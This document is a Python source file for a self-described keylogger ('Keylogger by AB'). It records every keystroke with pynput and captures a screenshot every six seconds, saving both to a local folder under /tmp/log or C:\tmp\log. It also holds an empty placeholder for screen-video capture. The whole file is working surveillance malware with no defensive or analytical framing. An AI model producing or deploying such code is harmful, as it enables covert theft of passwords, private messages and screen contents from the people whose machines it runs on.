
# built in modules 
import sys
import os
import subprocess 
import ctypes
import socket
import time
import logging
import shutil
import platform # we can use here platform.system() or os.name 
from threading import Thread
from multiprocessing import Process

# external libaries 
from pynput.keyboard import Listener
from PIL import ImageGrab



def initialize_logging(global_path):
    """
    Initializes the logging configuration.
    
    Args:
        global_path (str): The directory where log files will be stored.
    """
    log_file = os.path.join(global_path, 'logs.txt') 
    logging.basicConfig(filename=log_file, level=logging.INFO,
                        format='%(asctime)s - %(levelname)s - %(message)s')
    logging.info("Keylogger by AB started.")

def capture_keystroke(keys_logs_path):
    """
    Captures keystrokes and logs them to the specified file.
    
    Args:
        keys_logs_path (str): File path where keystrokes will be logged.
    """
    def on_press(key):
        try:
            with open(keys_logs_path, 'a') as log_file:
                log_file.write(f'{key}\n')
        except Exception as e:
            logging.error(f"Error logging key: {e}")
            print(f"Error logging key: {e}")

    with Listener(on_press=on_press) as listener:
        listener.join()

def capture_screenshots(screenshots_path, interval=6):
    """
    Captures screenshots at regular intervals and saves them to the specified directory.

    Args:
        screenshots_path (str): Directory where screenshots will be stored.
        interval (int): Interval between screenshots in seconds.
    """
    count = 1
    while True:
        try:
            screenshot = ImageGrab.grab()
            file_name = os.path.join(screenshots_path, f'screenshot_{count}.png')
            screenshot.save(file_name)
            count += 1
            time.sleep(interval)
        except Exception as e:
            logging.error(f"Error capturing screenshot: {e}")
            print(f"Error capturing screenshot: {e}")

def capture_screenvideos(path):
    # Placeholder for screen video capture implementation
    pass

# main function 
def main(): 
    """
    Sets up paths and starts capturing keystrokes, screenshots, and screen videos.
    """
    if os.name == 'posix':  # Linux or mac 
        global_path = '/tmp/log/keylogger-files'
    elif os.name == 'nt':  # Windows
        global_path = 'C:\\tmp\\log\\keylogger-files'
    else:
        raise OSError('Unsupported operating system!')
    
    if not os.path.exists(global_path): 
        os.makedirs(global_path)
    
    keys = os.path.join(global_path, 'keys.txt')
    screenshots_path = os.path.join(global_path, 'screenshots')
    screenvideos_path = os.path.join(global_path, 'screenvideos')

    for path in [screenshots_path, screenvideos_path]:
        if not os.path.exists(path):
            os.makedirs(path)
 
    initialize_logging(global_path)

    keys_process = Process(target=capture_keystroke, args=(keys,))
    keys_process.start()

    interval = 6
    screenshots_thread = Thread(target=capture_screenshots, args=(screenshots_path, interval))
    screenshots_thread.start()

    screenvideos_thread = Thread(target=capture_screenvideos, args=(screenvideos_path,))
    screenvideos_thread.start()


    keys_process.join(timeout=350)
    screenshots_thread.join(timeout=350)
    screenvideos_thread.join(timeout=350)


if __name__ == '__main__':
    try:
        main()  
    except KeyboardInterrupt:
        print("\nKeylogger terminated by user.")
        logging.info("Keylogger terminated by user.")
        # If unknown exception occurs #
    except Exception as ex:
        print(f'Unknown exception occurred: {ex}')
        logging.info(f'Unknown exception occurred: {ex}')
        sys.exit(1)

    sys.exit(0)
